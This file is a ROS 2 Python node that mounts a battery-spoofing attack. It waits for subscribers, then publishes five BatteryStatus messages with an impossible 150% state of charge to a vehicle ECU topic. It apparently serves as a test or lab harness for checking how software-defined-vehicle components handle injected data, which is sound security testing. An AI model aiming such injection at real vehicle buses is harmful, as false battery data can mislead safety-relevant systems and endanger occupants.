import rclpy
from rclpy.executors import ExternalShutdownException
from rclpy.node import Node

from sdv_interfaces.msg import BatteryStatus


class AttackNode(Node):

    def __init__(self):
        super().__init__('attack_node')
        self.declare_parameter('soc', 150.0)
        self.declare_parameter('voltage', 48.0)
        self.declare_parameter('current', 0.0)
        self.declare_parameter('publish_count', 5)
        self.declare_parameter('minimum_subscribers', 3)

        self.publisher = self.create_publisher(
            BatteryStatus,
            '/ecu/battery/status',
            10
        )
        self.remaining = int(self.get_parameter('publish_count').value)
        self.timer = self.create_timer(0.5, self.publish_attack)
        self.get_logger().warn(
            'Battery spoofing attack started; publishing invalid SOC'
        )

    def publish_attack(self):
        if self.remaining <= 0:
            self.timer.cancel()
            self.get_logger().info('Attack payload publication completed')
            rclpy.shutdown()
            return

        minimum_subscribers = int(
            self.get_parameter('minimum_subscribers').value
        )
        if self.publisher.get_subscription_count() < minimum_subscribers:
            return

        msg = BatteryStatus()
        msg.soc = float(self.get_parameter('soc').value)
        msg.voltage = float(self.get_parameter('voltage').value)
        msg.current = float(self.get_parameter('current').value)
        self.publisher.publish(msg)
        self.remaining -= 1


def main(args=None):
    rclpy.init(args=args)
    node = AttackNode()
    try:
        rclpy.spin(node)
    except ExternalShutdownException:
        pass
    node.destroy_node()
    if rclpy.ok():
        rclpy.shutdown()


if __name__ == '__main__':
    main()
